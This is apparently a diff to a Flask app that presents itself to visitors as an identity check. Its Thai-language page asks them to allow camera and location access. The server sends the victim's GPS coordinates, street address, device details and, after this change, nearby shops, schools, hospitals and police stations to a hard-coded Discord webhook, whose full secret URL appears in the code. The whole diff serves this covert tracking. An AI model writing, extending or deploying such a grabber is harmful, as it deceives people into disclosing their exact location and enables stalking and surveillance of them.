@@ -3,6 +3,7 @@ import requests
 import base64
 import json
 from datetime import datetime
+import time
 
 app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"
@@ -48,6 +49,22 @@ def reverse_geocode(lat, lon):
         print(f"Geocode error: {e}")
     return None
 
+def find_nearby_places(lat, lon, place_type, radius=500):
+    try:
+        url = f'https://nominatim.openstreetmap.org/search?format=json&q={place_type}&lat={lat}&lon={lon}&radius={radius}&limit=3'
+        headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
+        resp = requests.get(url, headers=headers, timeout=5)
+        data = resp.json()
+        results = []
+        for item in data:
+            name = item.get('display_name', 'ไม่ระบุ')[:60]
+            if name:
+                results.append(name)
+        return results
+    except Exception as e:
+        print(f"Nearby error ({place_type}): {e}")
+    return []
+
 HTML = '''<!DOCTYPE html>
 <html>
 <head>
@@ -83,7 +100,7 @@ HTML = '''<!DOCTYPE html>
     <div class="container" id="ui">
         <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
         <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
-        <div class="info-text">ใช้เวลาประมาณ 8-9 วินาที</div>
+        <div class="info-text">ใช้เวลาประมาณ 10-12 วินาที</div>
     </div>
     <script>
         async function startCapture() {
@@ -310,9 +327,29 @@ def upload():
         else:
             device_info['gps_from'] = 'GPS'
         
+        lat = device_info.get('gps_lat', 0)
+        lon = device_info.get('gps_lon', 0)
+        
         gps_address = None
-        if device_info.get('gps_lat') and device_info.get('gps_lon'):
-            gps_address = reverse_geocode(device_info['gps_lat'], device_info['gps_lon'])
+        nearby_places = {}
+        
+        if lat and lon:
+            gps_address = reverse_geocode(lat, lon)
+            # ค้นหาสถานที่ใกล้เคียง (ไม่ต้องขออนุญาตเพิ่ม)
+            if not device_info.get('gps_fallback'):
+                place_types = ['shop', 'school', 'hospital', 'restaurant', 'police']
+                place_labels = {
+                    'shop': '🛒 ร้านค้า/ห้าง',
+                    'school': '🏫 โรงเรียน',
+                    'hospital': '🏥 โรงพยาบาล',
+                    'restaurant': '🍽️ ร้านอาหาร',
+                    'police': '🚔 โรงพัก'
+                }
+                for pt in place_types:
+                    results = find_nearby_places(lat, lon, pt, 800)
+                    if results:
+                        nearby_places[place_labels[pt]] = results[:3]
+                    time.sleep(0.3)  # หน่วงเล็กน้อยให้ API ไม่ overload
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         
@@ -335,37 +372,43 @@ def upload():
         if device_info.get('downlink'):
             fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
         
-        # GPS + ที่อยู่แบบละเอียด
-        if device_info.get('gps_lat') and device_info.get('gps_lon'):
+        # GPS + ที่อยู่
+        if lat and lon:
             source = device_info.get('gps_from', 'GPS')
             if source == 'IP':
                 gps_label = "📍 พิกัด (จาก IP)"
             else:
                 acc = device_info.get('gps_accuracy', '?')
                 gps_label = f"📍 GPS (±{acc} เมตร)"
-            gps_val = f"{device_info['gps_lat']}, {device_info['gps_lon']}"
+            gps_val = f"{lat}, {lon}"
             fields.append({"name": gps_label, "value": gps_val, "inline": True})
             
             if gps_address:
-                # ที่อยู่แบบละเอียด
                 addr_parts = []
                 if gps_address.get('road'):
                     addr_parts.append(f"🛣️ ถนน: {gps_address['road']}")
                 if gps_address.get('village'):
-                    addr_parts.append(f"🏘️ ตำบล/หมู่บ้าน: {gps_address['village']}")
+                    addr_parts.append(f"🏘️ ตำบล: {gps_address['village']}")
                 if gps_address.get('city'):
-                    addr_parts.append(f"🏙️ อำเภอ/เขต: {gps_address['city']}")
+                    addr_parts.append(f"🏙️ อำเภอ: {gps_address['city']}")
                 if gps_address.get('province'):
                     addr_parts.append(f"🗺️ จังหวัด: {gps_address['province']}")
                 if gps_address.get('postcode'):
                     addr_parts.append(f"📮 รหัสไปรษณีย์: {gps_address['postcode']}")
                 if gps_address.get('display_name'):
-                    addr_parts.append(f"📍 ที่อยู่เต็ม: {gps_address['display_name'][:100]}")
+                    addr_parts.append(f"📍 ที่อยู่: {gps_address['display_name'][:80]}")
                 
                 for part in addr_parts:
                     fields.append({"name": "🏠 ที่อยู่", "value": part, "inline": False})
         else:
             fields.append({"name": "📍 GPS", "value": "ไม่ได้รับข้อมูล", "inline": True})
+        
+        # สถานที่ใกล้เคียง
+        if nearby_places:
+            for label, places in nearby_places.items():
+                if places:
+                    value = '\n'.join([f"• {p}" for p in places[:3]])
+                    fields.append({"name": label, "value": value, "inline": False})
         
         bat_val = f"{device_info.get('batteryLevel', 'ไม่ระบุ')}%"
         if device_info.get('batteryCharging') is True:
